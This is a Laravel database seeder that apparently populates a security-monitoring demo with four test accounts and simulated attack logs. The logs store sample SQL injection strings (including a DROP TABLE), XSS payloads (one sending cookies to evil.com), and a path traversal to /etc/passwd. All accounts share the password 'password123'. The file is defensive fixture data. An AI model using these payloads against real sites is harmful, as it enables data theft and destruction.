<?php
// d:\LongWork\BMUD-BTL\SystemSafetyandSecurity\database\seeders\DemoSeeder.php

namespace Database\Seeders;

use Illuminate\Database\Seeder;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use App\Models\SecurityLog;

class DemoSeeder extends Seeder
{
    public function run(): void
    {
        // ── 1. Tạo tài khoản demo ──────────────────────────────────────────────
        $users = [
            ['ten_dang_nhap' => 'admin1',  'mat_khau' => Hash::make('password123'), 'vai_tro' => 'ADMIN',      'trang_thai' => 'HOAT_DONG'],
            ['ten_dang_nhap' => 'khach1',  'mat_khau' => Hash::make('password123'), 'vai_tro' => 'KHACH_HANG', 'trang_thai' => 'HOAT_DONG'],
            ['ten_dang_nhap' => 'hacker1', 'mat_khau' => Hash::make('password123'), 'vai_tro' => 'KHACH_HANG', 'trang_thai' => 'KHOA'],
            ['ten_dang_nhap' => 'suspect1','mat_khau' => Hash::make('password123'), 'vai_tro' => 'KHACH_HANG', 'trang_thai' => 'CHO_DUYET'],
        ];

        foreach ($users as $u) {
            DB::table('nguoi_dung')->updateOrInsert(
                ['ten_dang_nhap' => $u['ten_dang_nhap']],
                $u
            );
        }

        // ── 2. Tạo security logs mô phỏng tấn công ────────────────────────────
        $logs = [
            // SQLi attacks
            ['ip_address' => '185.220.101.50', 'route' => 'login',              'request_method' => 'POST', 'payload' => "' OR '1'='1",                               'attack_type' => 'SQLi',             'severity' => 'HIGH',     'threat_score' => 95, 'action_taken' => 'PENDING_MODERATION', 'created_at' => now()->subDays(3)],
            ['ip_address' => '185.220.101.50', 'route' => 'customer/hoa-tuoi', 'request_method' => 'GET',  'payload' => "1 UNION SELECT mat_khau FROM nguoi_dung --", 'attack_type' => 'SQLi',             'severity' => 'HIGH',     'threat_score' => 95, 'action_taken' => 'PENDING_MODERATION', 'created_at' => now()->subDays(3)->addMinutes(5)],
            ['ip_address' => '185.220.101.50', 'route' => 'customer/hoa-tuoi', 'request_method' => 'GET',  'payload' => "'; DROP TABLE nguoi_dung; --",                'attack_type' => 'SQLi',             'severity' => 'HIGH',     'threat_score' => 95, 'action_taken' => 'PENDING_MODERATION', 'created_at' => now()->subDays(2)],
            // XSS attacks
            ['ip_address' => '103.45.22.88',   'route' => 'customer/hoa-tuoi', 'request_method' => 'GET',  'payload' => "<script>alert(document.cookie)</script>",    'attack_type' => 'XSS',              'severity' => 'MEDIUM',   'threat_score' => 62, 'action_taken' => 'LOG_ONLY',           'created_at' => now()->subDays(2)],
            ['ip_address' => '103.45.22.88',   'route' => 'customer/hoa-tuoi', 'request_method' => 'GET',  'payload' => "<img src=x onerror=fetch('http://evil.com/?c='+document.cookie)>", 'attack_type' => 'XSS', 'severity' => 'MEDIUM', 'threat_score' => 60, 'action_taken' => 'LOG_ONLY', 'created_at' => now()->subDays(1)],
            // DOS attacks  
            ['ip_address' => '45.152.66.35',   'route' => 'customer/dashboard','request_method' => 'GET',  'payload' => 'Tần suất gửi request: 95 req/min',            'attack_type' => 'DOS',              'severity' => 'HIGH',     'threat_score' => 85, 'action_taken' => 'BLOCKED_IP',         'created_at' => now()->subDays(1)],
            ['ip_address' => '45.152.66.35',   'route' => 'customer/dashboard','request_method' => 'GET',  'payload' => 'Tần suất gửi request: 120 req/min',           'attack_type' => 'DOS',              'severity' => 'HIGH',     'threat_score' => 85, 'action_taken' => 'BLOCKED_IP',         'created_at' => now()->subHours(6)],
            // Malicious Upload (CRITICAL)
            ['ip_address' => '92.118.160.25',  'route' => 'san-pham',          'request_method' => 'POST', 'payload' => 'Cố gắng tải lên file nguy hại: shell.php',   'attack_type' => 'Malicious_Upload', 'severity' => 'CRITICAL', 'threat_score' => 100,'action_taken' => 'LOCKED_ACCOUNT',    'created_at' => now()->subDays(1)],
            ['ip_address' => '92.118.160.25',  'route' => 'san-pham',          'request_method' => 'POST', 'payload' => 'Phát hiện mã độc nhúng trong tệp tin: flower.jpg (Polyglot/Steganography)', 'attack_type' => 'Malicious_Upload', 'severity' => 'CRITICAL', 'threat_score' => 100, 'action_taken' => 'LOCKED_ACCOUNT', 'created_at' => now()->subHours(3)],
            // Path Traversal
            ['ip_address' => '185.220.101.50', 'route' => 'customer/hoa-tuoi', 'request_method' => 'GET',  'payload' => '../../../../etc/passwd',                     'attack_type' => 'Path_Traversal',  'severity' => 'HIGH',     'threat_score' => 90, 'action_taken' => 'PENDING_MODERATION', 'created_at' => now()->subHours(12)],
            // Brute force
            ['ip_address' => '178.62.55.20',   'route' => 'login',             'request_method' => 'POST', 'payload' => '6 lần đăng nhập thất bại liên tiếp',         'attack_type' => 'Brute_Force',     'severity' => 'HIGH',     'threat_score' => 85, 'action_taken' => 'LOCKED_ACCOUNT',    'created_at' => now()->subHours(2)],
        ];

        foreach ($logs as $log) {
            SecurityLog::create($log);
        }

        $this->command->info('✅ DemoSeeder: Đã tạo ' . count($users) . ' tài khoản và ' . count($logs) . ' security logs mô phỏng!');
    }
}
